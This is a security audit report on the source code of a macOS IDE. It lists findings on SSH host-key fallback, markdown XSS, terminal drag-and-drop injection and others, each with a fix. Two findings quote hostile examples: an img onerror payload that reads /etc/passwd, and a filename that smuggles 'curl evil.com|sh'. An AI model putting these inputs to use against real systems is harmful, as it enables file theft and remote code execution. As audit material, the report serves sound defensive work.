# Security Scan Report

> **Historical record.** Active findings merged into `specs/security/THREAT_MODEL.md`.

Date: 2026-04-06
Scope: `projects/crispyvibes/crispyvibes/` (Swift source), `scripts/` (shell scripts)

## Summary

| Severity | Count |
|----------|-------|
| High     | 3     |
| Medium   | 12    |
| Low      | 5     |

---

## High Severity

### L3 — WKWebView granted root filesystem read access (Accepted)

**File:** `Features/Editor/Views/MarkupRenderedEditor.swift:40-60`

The `readAccessURL()` method returns `URL(fileURLWithPath: "/")` for both markdown and HTML modes.

**Why this is acceptable:** CrispyVibes is a file editor — users open files from anywhere on disk. This is the same model used by mainstream IDE webviews, Xcode's preview pane, and web browsers with `file://` URLs. The security boundary is not the read scope; it's the same-origin policy and the fact that the app controls the top-level page (bundled editor HTML) while user content is injected via `evaluateJavaScript`. Restricting read access would break relative image paths, local asset references, and HTML files that reference sibling resources.

---

### L4 — Browser WKWebView inspectable in all builds (Accepted)

**File:** `Features/VibeSpace/Services/Browser/BrowserPanelViewModel.swift:112`

```swift
webView.isInspectable = true
```

**Why this is acceptable:** The browser panel is a development tool within the IDE. Web Inspector access is an expected capability for developers debugging web applications — the same model as Chrome, Safari, and Firefox shipping with dev tools enabled. Disabling it would remove a core development feature.

---

## High Severity (Round 2)

### H3 — SSH host key verification falls back to `.acceptAnything()`

**File:** `Features/Remote/Services/SSHConnection.swift:93-95`

```swift
let validator: SSHHostKeyValidator = trustedKeys.isEmpty
    ? .acceptAnything() // Fallback if key parsing fails (shouldn't happen)
    : .trustedKeys(trustedKeys)
```

If NIOSSHPublicKey parsing fails for all trusted key lines from `KnownHostsValidator.preflight()`, the code silently falls back to accepting ANY host key without verification. This enables man-in-the-middle attacks on SSH connections.

**Risk:** An attacker performing a network MITM could present any host key and the connection would succeed, allowing interception of all SSH/SFTP traffic including file contents and terminal I/O.

**Recommendation:** Throw an error instead of falling back to `.acceptAnything()`:
```swift
guard !trustedKeys.isEmpty else {
    throw SSHRemoteError.hostKeyVerificationFailed(
        "Could not parse trusted host keys for \(profile.host). Refusing to connect."
    )
}
let validator: SSHHostKeyValidator = .trustedKeys(trustedKeys)
```

---

### H4 — Markdown XSS via HTML event handlers in rendered preview

**File:** `Resources/MarkdownRuntime/editor.html`

The markdown editor uses `marked.parse(markdown)` and sets `editor.innerHTML = html` with no HTML sanitization. marked.js passes through raw HTML in markdown by default. While `<script>` tags don't execute via innerHTML, event handlers do:

```markdown
<img src=x onerror="fetch('file:///etc/passwd').then(r=>r.text()).then(console.log)">
```

This executes in the WKWebView context which has root filesystem read access via `allowingReadAccessTo: URL(fileURLWithPath: "/")`.

**Risk:** Opening a malicious `.md` file could execute arbitrary JavaScript with access to the entire local filesystem. Data exfiltration is possible if the WebView has network access.

**Recommendation:** Add a Content-Security-Policy meta tag to `editor.html`:
```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self' file:; script-src 'self' 'unsafe-inline'; img-src 'self' file: data:;">
```
Or sanitize HTML output from marked.js using DOMPurify before setting innerHTML.

---

## Medium Severity (Round 2)

### M5 — DistributedNotificationCenter inter-process spoofing

**File:** `App/AppDelegate.swift:325-350`

The app uses `DistributedNotificationCenter` to forward file-open requests between app instances. Any process on the machine can post this notification with the same name (`CrispyVibesForwardedExternalOpen`), causing CrispyVibes to open arbitrary file paths.

```swift
DistributedNotificationCenter.default().post(
    name: Self.forwardedExternalOpenNotificationName,
    object: bundleIdentifier,
    userInfo: [
        Self.forwardedExternalOpenPathsKey: urls.map(\.path),
        Self.forwardedExternalOpenSenderPIDKey: currentPID,
    ]
)
```

The `senderPID` check only prevents self-delivery, not spoofing from other processes.

**Mitigating factors:** The receiver validates that paths exist on disk via `normalizedExistingExternalURLs`. Opening a file in an editor is low-impact compared to executing it.

**Recommendation:** Consider using XPC or Mach ports for inter-instance communication instead of DistributedNotificationCenter, or add a shared secret/nonce to validate the sender.

---

### M6 — Git clone executes repository hooks

**File:** `Features/VibeSpace/Services/PaneWorker/PaneWorkerExecutorGitCloneSupport.swift`

User-provided repository URLs are passed to `git clone --`. Cloning a malicious repository automatically executes post-checkout hooks with the user's privileges.

**Mitigating factors:** This is inherent to git's design. Xcode and mainstream git GUIs have the same behavior. The `--` separator prevents flag injection.

**Recommendation:** Document as accepted risk. Optionally, clone with `--config core.hooksPath=/dev/null` to disable hooks, though this may break legitimate workflows.

---

## Medium Severity (Rounds 3–5)

### M7 — Sparkle update feed URL is user-overridable via UserDefaults

**File:** `Models/AppPreferences.swift:58`, `App/AppDelegateUpdates.swift:202-204`

The Sparkle update feed URL is stored in UserDefaults (`appUpdateFeedURL`) and exposed in App Settings. A user (or malware with defaults write access) can point the update feed to an arbitrary URL.

```swift
func feedURLString(for updater: SPUUpdater) -> String? {
    Self.normalizedAppUpdateFeedURL(userDefaults: .standard)
}
```

**Mitigating factors:** Sparkle verifies EdDSA signatures on update payloads using the `SUPublicEDKey` embedded in Info.plist. An attacker would need the private signing key to serve a valid malicious update. The feed URL override alone is insufficient for exploitation.

**Recommendation:** Accepted risk given EdDSA verification. Consider logging when the feed URL differs from the Info.plist default.

---

### M8 — Diagnostics export includes CLI command configuration

**File:** `App/Diagnostics/AppDiagnostics.swift:228-250`

The diagnostics export payload includes `textServiceCLICommand`, `textServiceCLIArguments`, and `textServiceCLITrustMode` from UserDefaults. If a user shares a diagnostics export, it reveals their configured CLI tool and arguments.

**Mitigating factors:** This is user-initiated (save panel), not automatic. The data is operational, not credential-level.

**Recommendation:** Consider redacting or hashing CLI command/arguments in the export, or add a notice in the export UI that the file contains configuration details.

---

### M9 — Browser panel spoofs Safari user agent

**File:** `Features/VibeSpace/Services/Browser/BrowserPanelViewModel.swift:13`

```swift
static let safariUserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.2 Safari/605.1.15"
```

The browser panel presents itself as Safari 26.2 to all websites. This could cause websites to serve Safari-specific content or bypass browser-based security checks that distinguish between browsers.

**Mitigating factors:** Common practice for embedded browsers to use a mainstream user agent for compatibility. Not a direct vulnerability.

**Recommendation:** Low priority. Consider using a user agent that identifies as CrispyVibes while maintaining WebKit compatibility string.

---

## Low Severity (Rounds 3–5)

### L5 — PKCE fallback uses UUID if SecRandomCopyBytes fails

**File:** `Features/Settings/Services/CognitoAuthSecurity.swift:22-25`

```swift
let status = SecRandomCopyBytes(kSecRandomDefault, bytes.count, &bytes)
if status != errSecSuccess {
    return UUID().uuidString
}
```

If the system CSPRNG fails, the PKCE code verifier falls back to `UUID().uuidString` which has only 122 bits of entropy and a predictable format. SecRandomCopyBytes failure is extremely rare on macOS.

**Recommendation:** No action needed. The fallback is acceptable for the near-zero probability of CSPRNG failure.

---

## Medium Severity (Round 6)

### M10 — Ghostty loads user config files with no validation

**File:** `Features/Terminal/Services/GhosttyTerminalEngineSurfaceConfig.swift:183-203`

```swift
ghostty_config_load_default_files(config)
// ...
ghostty_config_load_file(config, configPath)
```

Ghostty loads its default config files from the user's home directory (`~/.config/ghostty/config`). A malicious or tampered Ghostty config could alter terminal behavior (e.g., keybindings, command execution). This is expected behavior for Ghostty but worth noting since CrispyVibes embeds it.

**Recommendation:** Accepted risk — same as any terminal emulator loading user config. Document that Ghostty config is loaded and can affect terminal behavior.

---

### M11 — Terminal URL handler opens arbitrary URLs via NSVibeSpace

**File:** `Features/Terminal/Services/GhosttyTerminalEngine.swift:170-212`

When a user clicks a link in the terminal, `handleOpenURL` processes the raw URL string from Ghostty and can open it via `NSVibeSpace.shared.open()`. This includes `file://` URLs and arbitrary URL schemes.

```swift
terminalServices.vibespaceInteraction.open(url)  // → NSVibeSpace.shared.open(url)
```

**Mitigating factors:** This is user-initiated (clicking a link in terminal output). The URL comes from terminal content the user is already viewing. Same behavior as mainstream terminal emulators.

**Recommendation:** Consider filtering dangerous URL schemes (e.g., `applescript://`, custom schemes that trigger app actions) if not already handled.

---

## High Severity (IDE CVE-class review)

### H5 — File drop onto terminal has insufficient shell escaping (Drag-and-Pwnd class)

**File:** `Features/Terminal/Views/TerminalSessionHostView.swift:232`

```swift
let escaped = relativePath.replacingOccurrences(of: " ", with: "\\ ")
session.engine.send(text: escaped)
```

When a file is dragged onto the terminal, only spaces are escaped. Shell metacharacters are NOT escaped: `;`, `|`, `&`, `` ` ``, `$()`, `>`, `<`, newlines, and control characters all pass through raw.

A file named `foo;curl evil.com|sh` dropped into the terminal would be interpreted by the shell as two commands: `foo` and `curl evil.com|sh`.

This is the same vulnerability class as known IDE drag-and-drop CVEs where ASCII control characters and shell metacharacters in filenames enabled command injection via drag-and-drop.

**Recommendation:** Use the existing `shellEscapedCommand` allowlist approach or always single-quote the path:
```swift
let escaped = "'" + relativePath.replacingOccurrences(of: "'", with: "'\\''") + "'"
session.engine.send(text: escaped)
```

---

## Medium Severity (IDE CVE-class review)

### M12 — DirectoryWatcher follows symlinks via `open(path, O_EVTONLY)`

**File:** `Features/VibeSpace/Services/FileSystem/DirectoryWatcher.swift:87`

```swift
let descriptor = open(path, O_EVTONLY)
```

The directory watcher uses `open()` which follows symlinks. A symlink placed inside a watched project directory could cause the watcher to monitor directories outside the project scope (e.g., `~/.ssh`, `/etc`). While the watcher only detects changes (doesn't read content), it could leak information about file modification times in sensitive directories.

**Mitigating factors:** The watcher is capped at 256 paths and only watches directories the user has explicitly opened as projects. Exploitation requires placing a symlink in the user's project.

**Recommendation:** Consider using `O_NOFOLLOW` or resolving symlinks before watching to stay within the project boundary.

---

## Medium Severity

### M1 — HMAC verification uses non-constant-time string comparison

**File:** `Data/Persistence/AppPersistenceDataStore.swift:117`

```swift
let verified = expectedHex == wrapper.signature
```

Standard string equality is not constant-time. While the practical risk is low (local file I/O, not network), this deviates from cryptographic best practice.

**Recommendation:** Use a constant-time comparison or compare the raw `Data` bytes:
```swift
let verified = HMAC<SHA256>.isValidAuthenticationCode(
    Data(hexString: wrapper.signature),
    authenticating: payloadData,
    using: signingKey
)
```

---

### M2 — No App Sandbox entitlements

**Files:** `crispyvibesDebug.entitlements`, `crispyvibesRelease.entitlements`

Both entitlement files contain empty `<dict/>`. The app runs without App Sandbox, giving it unrestricted filesystem and network access.

**Risk:** Standard for IDEs, but means any code execution vulnerability has full user-level access.

**Recommendation:** Document this as an accepted risk. Consider adding specific entitlements (e.g., `com.apple.security.network.client`) even without full sandboxing, to signal intent and enable future hardening.

---

### M3 — TextProcessorService passes external text as command argument

**File:** `Features/Editor/Services/TextProcessorService.swift:236-260`

User-selected text from macOS Services (invocable by any app) is passed as a command-line argument to external CLI tools via `/usr/bin/env`. The text is appended as the last argument in the array.

```swift
process.executableURL = URL(fileURLWithPath: "/usr/bin/env")
process.arguments = commandArguments(...)  // includes user text as last arg
```

**Mitigating factors:** Arguments are passed as an array (not through a shell), so shell metacharacter injection is not directly possible. The command itself comes from app preferences, not from the service input.

**Remaining risk:** If the configured CLI tool interprets the argument in an unsafe way, or if the argument starts with `--`, it could be misinterpreted as a flag.

**Recommendation:** Consider prepending `--` before the user text argument to signal end-of-options to the CLI tool.

---

### M4 — Remote preview temp files may not be fully cleaned up

**File:** `Features/Remote/Services/SFTPFileContentProvider.swift` (referenced in architecture docs)

Remote binary previews (images, PDFs) are staged as temporary local files. Cleanup occurs on document change, but edge cases (app crash, force quit) may leave sensitive remote file content on disk.

**Recommendation:** Use `NSTemporaryDirectory()` with unique subdirectories and register cleanup in `applicationWillTerminate`. Consider using `FileManager.default.temporaryDirectory` with auto-cleanup attributes.

---

## Low Severity

### L1 — Force-unwrap `try!` for regex compilation

**File:** `Features/Terminal/Support/TerminalInteractiveTargetDetector.swift:55-58`

```swift
private static let fileReferencePattern = try! NSRegularExpression(...)
private static let bareFileReferencePattern = try! NSRegularExpression(...)
```

**Risk:** App crash if regex pattern is invalid. Patterns are compile-time constants so this is safe in practice.

**Recommendation:** No action needed, but `try?` with a fallback would be more defensive.

---

### L2 — Cognito client ID in Info.plist

**File:** `Info.plist` — `CrispyVibesCognitoMacClientId: 1ta72b7cebgavc19qe2c3233sm`

**Risk:** None — this is a public OAuth client ID, not a secret. Cognito public clients are designed to have their client IDs embedded in apps.

**Recommendation:** No action needed. Documented for completeness.

---

## Positive Findings

The scan also identified several well-implemented security controls:

- **HMAC-SHA256 config signing** with Keychain-stored keys — solid integrity protection
- **Atomic file writes** (`Data.write(to:options:.atomic)`) throughout persistence layer
- **No credential logging** — grep for password/secret/token/credential in logger calls returned zero matches
- **SSH key-based auth only** — password auth intentionally unsupported
- **Sparkle EdDSA verification** — update integrity properly enforced
- **Input clamping** — terminal count (1-8), shortcut indices (1-9) properly bounded
- **Untrusted config handling** — tampered configs load for display but block command execution
- **SVGFilePreview disables JavaScript** — `allowsContentJavaScript = false`
